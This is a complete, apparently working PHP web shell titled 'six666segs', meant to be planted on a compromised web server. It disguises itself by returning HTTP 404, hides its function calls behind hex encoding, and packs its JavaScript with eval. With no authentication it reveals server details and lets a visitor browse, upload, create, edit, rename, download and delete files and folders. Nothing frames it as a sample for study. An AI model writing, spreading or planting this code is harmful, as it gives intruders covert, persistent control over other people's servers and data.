<?php
header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set("display_errors", false);
http_response_code(404);
define("self", "six666segs");
$scD = "s\x63\x61\x6e\x64\x69r";
$fc = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65");
for ($i = 0; $i < count($fc); $i++)
	$fc[$i] = nhx($fc[$i]);
if (isset($_GET["p"])) {
	$p = nhx($_GET["p"]);
	$fc[3](nhx($_GET["p"]));
} else {
	$p = $fc[2]();
}
function hex($str) {
	$r = "";
	for ($i = 0; $i < strlen($str); $i++)
		$r .= dechex(ord($str[$i]));
	return $r;
}
function nhx($str) {
	$r = "";
	$len = (strlen($str) -1);
	for ($i = 0; $i < $len; $i += 2)
		$r .= chr(hexdec($str[$i].$str[$i+1]));
	return $r;
}
function perms($f) {
	$p = fileperms($f);
	if (($p & 0xC000) == 0xC000) $i = 's';
	elseif (($p & 0xA000) == 0xA000) $i = 'l';
	elseif (($p & 0x8000) == 0x8000) $i = '-';
	elseif (($p & 0x6000) == 0x6000) $i = 'b';
	elseif (($p & 0x4000) == 0x4000) $i = 'd';
	elseif (($p & 0x2000) == 0x2000) $i = 'c';
	elseif (($p & 0x1000) == 0x1000) $i = 'p';
	else $i = 'u';

	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function a($msg, $sts = 1, $loc = "") {
	global $p;
	$status = (($sts == 1) ? "success" : "error");
	echo "<script>swal({title: \"{$status}\", text: \"{$msg}\", icon: \"{$status}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".hex($p).$loc."\"}})</script>";
}
function deldir($d) {
	global $fc;
	if (trim(pathinfo($d, PATHINFO_BASENAME), '.') === '') return;
	if ($fc[6]($d)) {
		array_map("deldir", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
		rmdir($d);
	} else {
		unlink($d);
	}
}
?>
<!doctype html>
<html lang="en"><head><link rel="icon" type="image/png" href="https://telegra.ph/file/5eff4384d348c68a7e978.png"><meta name="theme-color" content="red"><meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title><?= self ?></title><style>.table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border border-primary-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style><script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script></head><body style="background-color:#000;color:#fff;font-family:serif;"><div class="bg-black table-responsive text-light border border-primary rounded"><div class="d-flex justify-content-between p-1"><div><h3 class="mt-2"><a href="?"><?= self ?></a></h3></div><div><span>PHP Version : <?= $fc[1]() ?></span> <br><a href="?p=<?= hex($p)."&a=".hex("newFile") ?>">+File</a><a href="?p=<?= hex($p)."&a=".hex("newDir") ?>">+Directory</a></div></div><div class="border-primary border-top table-responsive">
<li>uname : <?= $fc[0]() ?></li>
<li>doc Root: <?= "{$_SERVER["DOCUMENT_ROOT"]}"; ?></li>
<li>server: <?= "{$_SERVER["SERVER_ADDR"]}/{$_SERVER["REMOTE_ADDR"]}"; ?></li>
<li>domain : <?= "{$_SERVER["SERVER_NAME"]}"; ?></li>
<li>ip server: <?= getHostByName(getHostName()); ?></li>
<li>php Version: <?= phpversion(); ?></li>
<li>mysql: <?= (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
<li>curl: <?= (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
</div><form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-1 bg-transparent text-light">Choose file</label></div></div></form>
<?php
if (isset($_FILES["f"])) {
	$n = $_FILES["f"]["name"];
	for ($i = 0; $i < count($n); $i++) {
		if ($fc[11]($_FILES["f"]["tmp_name"][$i], $n[$i])) {
			a("file uploaded successfully");
		} else {
			a("file failed to upload", 0);
		}
	}
}
if (isset($_GET["download"])) {
	header("Content-Type: application/octet-stream");
	header("Content-Transfer-Encoding: Binary");
	header("Content-Length: ".$fc[17](nhx($_GET["n"])));
	header("Content-disposition: attachment; filename=\"".nhx($_GET["n"])."\"");
}
?>
</div><div class="shadow-lg bg-black border border-primary table-responsive mt-2 rounded"><div class="ml-2" style="font-size:18px;"><span>Path: </span>
<?php
$ps = $fc[4]("/(\\\|\/)/", $p);
foreach ($ps as $k => $v) {
	if ($k == 0 && $v == "") {
		echo "<a href=\"?p=2f\">~</a>/"; continue;
	}
	if ($v == "") continue;
	echo "<a href=\"?p=";
	for ($i = 0; $i <= $k; $i++) {
		echo hex($ps[$i]);
		if ($i != $k) echo "2f";
	}
	echo "\">{$v}</a>/";
}
?>
</div></div><article class="shadow-lg bg-black border border-primary table-responsive mt-2 rounded">
<?php if (!isset($_GET["a"])): ?>
<table class="table table-hover table-border borderless table-sm"><thead class="text-light"><tr><th>Name</th><th>Size</th><th>Permission</th><th>Action</th></tr></thead><tbody class="text-light">
<?php
$scD = $fc[5]($scD($p), [".", ".."]);
foreach ($scD as $d) {
	if (!$fc[6]("$p/$d")) continue;
	echo "<tr><td><a href=\"?p=".hex("$p/$d")."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$fc[19]("Y-m-d H:i", $fc[20]("$p/$d"))."\"><i class=\"fa fa-fw fa-folder\"></i> {$d}</a></td><td>N/A</td><td><font color=\"".(($fc[8]("$p/$d")) ? "lime" : (!$fc[9]("$p/$d") ? "red" : null))."\">".perms("$p/$d")."</font></td><td><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($d)."&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($d)."\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></td></tr>";
}
foreach ($scD as $f) {
	if (!$fc[7]("$p/$f")) continue;
	$sz = $fc[10]("$p/$f")/1024;
	$sz = round($sz, 3);
	$sz = ($sz > 1024) ? round($sz/1024, 2)."MB" : $sz."KB";
	echo "<tr><td><a href=\"?p=".hex($p)."&a=".hex("view")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$fc[19]("Y-m-d H:i", $fc[20]("$p/$f"))."\"><i class=\"fa fa-fw fa-file\"></i> {$f}</a></td><td>{$sz}</td><td><font color=\"".(($fc[8]("$p/$f")) ? "lime" : (!$fc[9]("$p/$f") ? "red" : null))."\">".perms("$p/$f")."</font></td><td><div class=\"d-flex justify-content-between\"><a href=\"?p=".hex($p)."&a=".hex("edit")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($f)."&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&n=".hex($f)."&download"."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($f)."\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></div></td></tr>";
}
?></tbody></table>
<?php else :if (isset($_GET["a"])) $a = nhx($_GET["a"]); ?>
<div class="px-2 py-2">
<?php if ($a == "delete") {
	$loc = $p.'/'.nhx($_GET["n"]);
	if ($_GET["t"] == "d") {
		deldir($loc);
		if (!$fc[12]($loc)) {
			a("folder deleted successfully");
		} else {
			a("failed to delete the folder", 0);
		}
	}
	if ($_GET["t"] == "f") {
		$loc = $p.'/'.nhx($_GET["n"]);
		unlink($loc);
		if (!$fc[12]($loc)) {
			a("file deleted successfully");
		} else {
			a("file to delete the folder", 0);
		}
	}
}
?>
<?php if ($a == "newDir"): ?>
<h5 class="border border-primary p-1 mb-3">New folder</h5>
<form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
<?php ((isset($_POST["s"])) ? ($fc[12]("$p/{$_POST["n"]}") ? a("folder name has been used", 0, "&a=".hex("newDir")) : ($fc[15]("$p/{$_POST["n"]}") ? a("folder created successfully") : a("folder failed to create", 0))) : null); elseif ($a == "newFile"): ?>
<h5 class="border border-primary p-1 mb-3">New file</h5>
<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
<?php ((isset($_POST["s"])) ? ($fc[12]("$p/{$_POST["n"]}") ? a("file name has been used", 0, "&a=".hex("newFile")) : ($fc[13]("$p/{$_POST["n"]}", $_POST["ctn"]) ? a("file created successfully",1,"&a=".hex("view")."&n=".hex($_POST["n"])) : a("file failed to create", 0))) : null); elseif ($a == "rename"): ?>
<h5 class="border border-primary p-1 mb-3">Rename <?= (($_GET["t"] == "d") ? "folder" : "file") ?></h5>
<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= nhx($_GET["n"]) ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
<?php ((isset($_POST["s"])) ? ($fc[16]($p.'/'.nhx($_GET["n"]), $_POST["n"]) ? a("successfully changed the folder name") : a("failed to change the folder name", 0)) : null); elseif ($a == "edit"): ?>
<h5 class="border border-primary p-1 mb-3">Edit file</h5>
<span>File name : <?= nhx($_GET["n"]) ?></span>
<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
<?php ((isset($_POST["s"])) ? ($fc[13]($p.'/'.nhx($_GET["n"]), $_POST["ctn"]) ? a("file contents changed successfully", 1, "&a=".hex("view")."&n={$_GET["n"]}") : a("file contents failed to change")) : null); elseif ($a == "view"): ?>
<h5 class="border border-primary p-1 mb-3">View file</h5>
<span>File name : <?= nhx($_GET["n"]) ?></span>
<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea></div><?php endif; ?></div><?php endif; ?></article><div class="bg-black text-center mt-2"><small></small></div><script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script><script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script></body></html>
